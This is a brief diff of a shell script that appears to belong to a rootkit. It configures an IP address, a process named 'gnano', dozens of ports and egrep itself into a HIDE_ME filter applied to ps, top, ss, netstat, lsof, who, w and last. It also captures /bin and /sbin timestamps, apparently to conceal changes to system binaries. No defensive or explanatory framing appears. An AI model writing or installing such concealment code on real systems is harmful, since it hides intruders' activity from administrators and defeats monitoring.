@@ -9,11 +9,14 @@ get_timestamp () {
 	stat -L $1 | grep Modify | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
 }
 
-COMMANDS="ps ss netstat lsof who w last"
+# *** Configurable variables ***
 IP="10.10.2.4"
-IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP
-HIDE_ME="$IP_ESCAPED|1414|1415|1416|1417|59000|59001|59002|59003|60000|60001|60002|60003"
+IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP for use with egrep
+COMMANDS="ps top ss netstat lsof who w last"
+PROCESSES="gnano"
+HIDE_ME="egrep|$IP_ESCAPED|$PROCESSES|59000|59001|59002|59003|59004|59005|59006|59007|59008|59009|60000|60001|60002|60003|60004|60005|60006|60007|60008|60009"
 
+# *** Main ***
 bin_timestamp=$(get_timestamp /bin)
 sbin_timestamp=$(get_timestamp /sbin)
 
